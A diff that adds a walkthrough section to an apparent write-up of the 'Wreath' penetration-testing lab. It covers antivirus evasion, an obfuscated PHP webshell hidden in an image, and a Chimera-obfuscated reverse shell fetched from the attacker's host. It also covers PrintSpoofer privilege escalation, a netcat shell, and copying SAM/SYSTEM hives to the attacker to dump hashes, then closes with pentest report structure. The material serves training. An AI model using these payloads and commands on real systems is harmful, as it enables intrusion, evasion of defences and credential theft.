@@ -843,21 +843,275 @@ Upload it again and access it while also appending the parameter `?cmd=whoami`. 
 
 ## AV Evasion
 
+When it comes to AV evasion we have two primary types available:
+
+* On-Disk evasion
+* In-Memory evasion
+
+On-Disk evasion is when we try to get a file (be it a tool, script, or otherwise) saved on the target, then executed. This is very common when working with executable (`.exe`) files.
+
+In-Memory evasion is when we try to import a script directly into memory and execute it there. For example, this could mean downloading a PowerShell module from the internet or our own device and directly importing it without ever saving it to the disk.
+
+In terms of methodology: ideally speaking, we would start by attempting to fingerprint the AV on the target to get an idea of what solution we're up against. As this is often an interactive (social-engineering reliant) process, we will skip it for now and assume that the target is running the default Windows Defender so that we can get straight into the meat of the topic. If we already have a shell on the target, we may also be able to use programs such as [SharpEDRChecker](https://github.com/PwnDexter/SharpEDRChecker) and [Seatbelt](https://github.com/GhostPack/Seatbelt) to identify the antivirus solution installed. Once we know the OS version and AV of the target, we would then attempt to replicate this environment in a virtual machine which we can use to test payloads against. Note that we should _always_ disable any kind of cloud-based protection in the AV settings (potentially by outright disconnecting the VM from the internet) so that the AV doesn't upload our carefully crafted payloads to a server somewhere for analysis, destroying all our hard work. Once we have a working payload, we can then deploy it against the target!
+
+AV Evasion usually involves some form of obfuscation when it comes to payloads. This could mean anything from moving things around in the exploit and changing variable names, to encoding aspects of the script, to outright encrypting the payload and writing a wrapper to decrypt and execute the code section-by-section. The aim is to switch things enough that the AV software is unable to detect anything bad.
+
+### Detection Methods
+
+Generally speaking, detection methods can be classified into one of two categories:
+
+* Static Detection
+* Dynamic / Heuristic / Behavioural Detection
+
+Modern Antivirus software will usually rely on a combination of these.
+
+**Static detection** methods usually involve some kind of signature detection. A very rudimentary system, for example, would be taking the hashsum of the suspicious file and comparing it against a database of known malware hashsums. This system does tend to be used; however, it would never be used by itself in modern antivirus solutions. For this reason it's usually a good idea to change _something_ when working with a known exploit. The smallest change to the file will result in a completely different hashsum, so even something as small as changing a string in the help message would be enough to bypass this kind of rudimentary detection system
+
+The other form of static detection which is often used in antivirus software (to much greater effect) is a technique called Byte (or string) matching. Byte matching is another form of signature detection which works by searching through the program looking to match sequences of bytes against a known database of bad byte sequences. This is much more effective than just hashing the entire file! Of course, it also means that we (as hackers) have a much harder job tracking down the exact line of code responsible for the flag.
+
+static virus malware detection methods look at the file itself, dynamic methods look at how the file _acts._ There are a couple of ways to do this.
+
+1. AV software can go through the executable line-by-line checking the flow of execution. Based on _pre-defined rules_ about what type of action is malicious (e.g. is the program reaching out to a known bad website, or messing with values in the registry that it shouldn't be?), the AV can see how the program _intends_ to act, and make decisions accordingly
+2. The suspicious software can outright be executed inside a sandbox environment under close supervision from the AV software. If the program acts maliciously then it is quarantined and flagged as malware
+
+\
+That said, dynamic detection methods are usually a lot more effective than static methods. The drawback is, once again, the time and resources required to spin up a VM to analyse the file in, or go through it line-by-line to see if it's doing anything malicious. These are actions that take time (causing users to grow impatient), and use up a lot of the computer's available resources. Once again the AV has to compromise, using a combination of dynamic and static analysis when scanning a file.
+
+### PHP Payload Obfuscation
+
+First up, let's build that payload:
+
+{% code overflow="wrap" lineNumbers="true" %}
+```php
+<?php
+    $cmd = $_GET["wreath"];
+    if(isset($cmd)){
+        echo "<pre>" . shell_exec($cmd) . "</pre>";
+    }
+    die();
+?>
+```
+{% endcode %}
+
+Here we check to see if a GET parameter called "wreath" has been set. If so, we execute it using `shell_exec()`, wrapped inside HTML `<pre>` tags to give us a clean output. We then use `die()` to prevent the rest of the image from showing up as garbled text on the screen.
+
+This is slightly longer than the classic PHP one-liner webshell (`<?php system($_GET["cmd"]);?>`) for two reasons:
+
+1. If we're obfuscating it then it will become a one-liner anyway
+2. Anything _different_ is good when it comes to AV evasion
+
+We now need to obfuscate this payload.
+
+There are a variety of measures we could take here, including but not limited to:
+
+* Switching parts of the exploit around so that they're in an unusual order
+* Encoding all of the strings so that they're not recognisable
+* Splitting up distinctive parts of the code (e.g. `shell_exec($_GET[...])`)
+
+We use this site to Obfuscate our php payload --> [here](https://www.gaijin.at/en/tools/php-obfuscator)
+
+<figure><img src=".gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>
+
+And got:
+
+{% code overflow="wrap" lineNumbers="true" %}
+```php
+<?php $i0=$_GET["wreath"];if(isset($i0)){echo "<pre>".shell_exec($i0)."</pre>";}die();?>
+```
+{% endcode %}
+
+So we use "exiftool" to add comment to a .png file again.
+
+But the problem is the dollar signs, bash is gonna treat them as variables so to get rid of that problem we will put `\` characters in front of them to skip them.
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+exiftool -Comment="<?php \$i0=\$_GET["wreath"];if(isset(\$i0)){echo '<pre>'.shell_exec(\$i0).'</pre>';}die();?>" shell.png
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>
+
+And we bypassed the AV.
+
+### Compiling Netcat & Reverse Shell!
+
+Our webshell is all well and good, but let's go for a full reverse shell!
+
+Realistically we have several options here:
+
+* Powershell tends to be the go-to for Windows reverse shells. Unfortunately Defender knows exactly what PowerShell reverse shells look like, so we'd have to do some serious obfuscation to get this to work.
+* We could try to get a PHP reverse shell as we know the target has a PHP interpreter installed. Windows PHP reverse shells tend to be iffy though, and again, may trigger Defender.
+* We could generate an executable reverse shell using msfvenom, then upload and activate it using the webshell. Again, msfvenom shells tend to be very distinctive. We could use the [Veil Framework](https://www.veil-framework.com/) to give us a meterpreter shell executable that might bypass Defender, but let's try to keep this manual for the time. Equally, [shellter](https://www.shellterproject.com/) (though old) might give us what we need. There are easier options though.
+* We could use [chimera](https://github.com/tokyoneon/Chimera)
+
+I used this [tool](https://github.com/tokyoneon/Chimera) to obfuscate the nishang powershell reverse shell, it’s the full reverse shell, not the oneliner one. So the steps were :
+
+1. Get the nishang Powershell Tcp Reverse shell from [_**here**_](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).
+2. Install the chimera tool as mentioned in the blog post from github.
+3. Edit the nishang script and put your IP and the port where you want the reverse shell on. Specifically take this line from the examples in the script and put it in the end&#x20;
+
+<figure><img src=".gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>
+
+`Invoke-PowerShellTcp -Reverse -IPAddress`` ``10.50.88.51 -Port 9002` like this. I named it `inv.ps1` .
+
+4\. Finally obfuscate the script with chimera using the following command. The obfuscated script will be at located at `/tmp/chimera.ps1`
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+/opt/chimera/chimera.sh -f inv.ps1 -l 3 -o /tmp/inv.ps1 -v -t powershell,windows,\copyright -c -i -h -s length,get-location,ascii,stop,close,getstream -b new-object,reverse,\invoke-expression,out-string,write-error -j -g -k -r -p
+```
+{% endcode %}
+
+5\. Host the script with python webserver in the directory where script is.
+
+```
+root@kali -> python3 -m http.server 80
+```
+
+6\. Upload the script using the webshell and good old `curl` .
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+http://localhost:9020/resources/uploads/mal.png.php?wreath=curl http://10.50.88.51/inv.ps1 -o c:\\windows\\temp\\inv.ps1
+```
+{% endcode %}
+
+7. start the listener `rlwrap nc -lnvp 9002` and execute the chimera script with&#x20;
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+http://localhost:9020/resources/uploads/mal.png.php?wreath=powershell.exe -c "c:\\windows\\temp\\inv.ps1"
+```
+{% endcode %}
+
+And we got the shell
+
+<figure><img src=".gitbook/assets/image (121).png" alt=""><figcaption><p>success</p></figcaption></figure>
+
+## Privilege Escalation
+
+Let's start by looking for non-default services:\
+`wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"`
+
+We discover a "SystemExplorerHelpService" service with Unquoted Path Name.
+
+So i will just exploit the "SeImpersonatePrivilege" using PrintSpoofer Abuse attack, or we can also use the [Juicy Potato attack](https://jlajara.gitlab.io/Potatoes\_Windows\_Privesc?source=post\_page-----439b36e5e96a--------------------------------).
+
+{% embed url="https://jlajara.gitlab.io/Potatoes_Windows_Privesc?source=post_page-----439b36e5e96a--------------------------------" %}
+
+This attack also works on the same idea of escalating privilege from Local Service/ Network Service account (We are a service account because remember our user was running the webserver ? that means the XAMPP Service for this machine.) to a Sytem Level Account but it utilizes the `Print Spooler` service and get a `System Level Token` to run a custom command with that elevated privilege with `CreateProcessAsUser()` function.
+
+1. First get the prebuilt executable file (64 bit one) from the github release page of the PrintSpoofer tool. [https://github.com/itm4n/PrintSpoofer/releases](https://github.com/itm4n/PrintSpoofer/releases)
+2. Host the file with python in attack machine.
+3. curl the file into the windows shell that we have. And make sure to download it in one of those world writable directories to avoid AV. I did it in the `c:\windows\system32\spool\drivers\color` directory.
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+curl http://10.50.55.240/PrintSpoofer64.exe -o dking.exe
+```
+{% endcode %}
+
+4\. Now simply launch the attack.
+
+```
+.\dking.exe -i -c whoami
+```
+
+<figure><img src=".gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>
+
+See the command has been executed as `nt authority\system` but we don’t get to keep the interactive shell. It closes by itself. So for better persistence, we can just create a netcat connection to our Attack Machine. To do that, upload 64 bit netcat binary from github and upload that to the Machine.
+
+`.\dking.exe -c "C:\xampp\htdocs\resources\uploads\nc64.exe 10.50.88.51 1212 -e cmd"` - type in the .100 machine.
+
+<figure><img src=".gitbook/assets/image (123).png" alt=""><figcaption><p>and we got nt system.</p></figcaption></figure>
+
+{% hint style="danger" %}
+Mmikatz won't work here because of antivirus detection.
+
+To dump the hashes, we need to dump 2 Hives.
+
+1. The SAM Hive which contains all the user hashes that were cached while logging in.
+2. The System Hive which contains system information and the boot key.
+
+While the computer is on, these files are constantly getting used, so we can’t directly download these. So the trick is to make a backup of these files which will be the exact same copy and download the copies. We can use robocopy or reg.exe to do this. Then transfer them to our Attack machine and use a tool to dump hashes from them.
+{% endhint %}
+
+**Step 1** : Make copies of SAM and SYSTEM.
+
+```powershell
+reg.exe save HKLM\SAM sam.bak
+reg.exe save HKLM\SYSTEM system.bak
+```
+
+<figure><img src="https://miro.medium.com/v2/resize:fit:336/1*3A1WxMZQZc1vXvBRelb3lQ.png" alt="" height="155" width="488"><figcaption></figcaption></figure>
+
+**Step 2** : Transfer those bak files to attack machine. To do this, I hosted a smbserver from impacket. SMB is very windows oriented so it’s extremely easy to transfer to/from windows using SMB Server. So I created a share named `share` in the current directory. Then used `net use` to connect and `move` to actually transfer the files.
+
+{% code overflow="wrap" lineNumbers="true" %}
+```powershell
+#Attack Machine
+root@kali -> impacket-smbserver share -smb2support .
+
+#Victim Machine
+PS> net use \\10.50.55.240\share
+PS> move sam.bak \\10.50.55.240\share\sam.bak
+PS> move system.bak \\10.50.55.240\share\system.bak
+```
+{% endcode %}
+
+**Step 3 :** Now finally as we have the necessary files, let’s do the dump. To do that I will use another tool from impacket named `secretsdump` .
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+python  impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>
+
+## Debrief and Report
+
+Hopefully you've been taking notes and are now about to start writing a report on the topic. If you're not familiar with pentest reports, the following task may come in handy. Additionally, Offensive Security have also published an example penetration test report [here](https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf), and there is a whole community-curated repository of public reports [here](https://github.com/juliocesarfort/public-pentesting-reports) should you need more inspiration.
+
+<details>
+
+<summary>Contents of a Report</summary>
+
+Penetration test reports are generally split into several sections. There is no strictly defined standard unfortunately, but the following layout should be well received:\
+
+
+* First up is the _Executive Summary_. This should be essentially non-technical, providing a brief overview of the job that was contracted to (and completed by) the pentester, including a concise summary of the scope of the engagement. You should also include a very short summary of the results here, as well as a concise analysis of the overall security posture of the company. Be aware thought that, as the name suggests, this section is designed to be read by the higher-ups in a company who may not have a technical background or the time to devote to a long-winded explanation. This section is particularly important as in many cases it may be the only section that the client actually looks at. It should catch the eye, and will set the tone for the rest of the report.\
+
+* At the end of (or immediately after) the executive summary include a _Timeline_ showing an overview of what you did and when you did it. This allows whoever is assigned to fix the vulnerabilities to check any logs from the compromised system and see what a successful attack looks like from their own privileged perspective.\
+
+* Next we have the _Findings and Remediations_ section. This should be a more technical section. It should provide a detailed explanation of the  vulnerabilities you found _as well as your suggested fixes for these._ Additionally, you should indicate the severity of each vulnerability, and the risk to the company should the vulnerability be exploited by a bad actor -- the [CVSS calculator](https://www.first.org/cvss/calculator/3.1) will be useful for this. You should not necessarily be providing a step-by-step account of your methodology here, but there should be enough detail for a technically-able person to see what the problem is, and what the solutions might be.\
+
+* After the findings and remediations should come the _Attack Narrative_. This _should_ be a step-by-step writeup of the actions you took against the targets, including enough detail for a technically-competent individual to replicate the attacks exactly in an almost copy-and-paste approach. In many ways this is similar to a detailed write-up for a CTF.
+* A section that is good to include but often skipped: the _Cleanup_ section. This should detail the actions you took to eradicate your presence on the targets (e.g. removing any added accounts, deleting exploits or created files, etc).
+* Next (but not last), there should be a _Conclusion_. This just summarises the report, rounding off the results and stressing the importance of patching as required.
+* Finally you should include _References_ then _Appendices_. The references section includes full references to any works cited throughout the report (for example, maybe a quote or table from the OWASP website, or referencing a newspaper article on an attack which utilised a vulnerability found in the target network). The references section should also be used to link to relevant CVEs (Common Vulnerability and Exposure), CWEs (Common Weakness Enumerations), and/or CAPECs (Common Attack Pattern Enumerations and Classifications) for the found vulnerabilities. Your appendices should include any large pieces of information that would have cluttered up the main text. For example, if you had to edit an exploit (as we did during the Wreath network), you should include a full copy of the edited code as an appendix and reference it when mentioned in the other sections. Equally, any code you write should also be stored here (with the exception of short snippets and one-liners, which can be placed inline at the relevant section), along with any large amounts of data or big tables / diagrams.
+
+So, the sections should be:
+
+1. Executive Summary
+2. Timeline
+3. Findings and Remediations
+4. Attack Narrative
+5. Cleanup
+6. Conclusion
+7. References
+8. Appendices\
+
+
+Pentest reports will usually also have a branded front-cover and a table of contents before the report itself begins.\
+
+
+There are many pentest report templates available on the Internet which can be used to provide a baseline for this. Many companies will also provide their penetration testers with a company-specific template to follow. Regardless, of whether you use a pre-built template or create your own, find a style and stick with it!
+
+</details>
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+Done.
 
